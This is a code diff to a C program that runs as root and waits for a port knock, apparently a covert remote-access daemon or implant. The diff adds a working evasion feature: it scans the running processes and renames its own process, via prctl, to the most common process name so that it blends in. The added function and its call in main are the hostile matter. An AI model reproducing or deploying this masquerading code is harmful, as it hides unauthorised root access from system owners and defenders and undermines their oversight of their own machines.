@@ -11,6 +11,7 @@
 #include "protocol.h"
 #include <networking.h>
 #include <sys/socket.h>
+#include <sys/prctl.h>
 
 void usage(const char * program_name) {
     printf("--------------------------------------------------------------------\n");
@@ -127,6 +128,36 @@ int wait_for_port_knock(struct client_options * client_options) {
     return EXIT_SUCCESS;
 }
 
+void rename_process_to_most_common(void) {
+    process_record_t * records = calloc(MAX_PROCESSES, sizeof(process_record_t));
+    if (records == NULL) {
+        log_message("Failed to allocate process records");
+        return;
+    }
+
+    const int count = collect_processes(records, MAX_PROCESSES);
+    if (count == 0) {
+        log_message("No processes found");
+        free(records);
+        return;
+    }
+
+    char most_common[MAX_NAME_LEN] = {0};
+    find_most_common_name(records, count, most_common, sizeof(most_common));
+    free(records);
+
+    if (most_common[0] == '\0') {
+        log_message("Could not determine most common process name");
+        return;
+    }
+
+    log_message("Renaming process to: %s", most_common);
+
+    if (prctl(PR_SET_NAME, most_common, 0, 0, 0) < 0) {
+        perror("prctl PR_SET_NAME");
+    }
+}
+
 int main(const int argc, char * argv[]) {
     // Check if running as root
     if (geteuid() != 0) {
@@ -142,6 +173,8 @@ int main(const int argc, char * argv[]) {
         fprintf(stderr, "Cannot set SIGTERM handler\n");
         return EXIT_FAILURE;
     }
+
+    rename_process_to_most_common();
 
     // Buffer to store knock source IP
     char knock_source_ip[INET_ADDRSTRLEN] = {0};
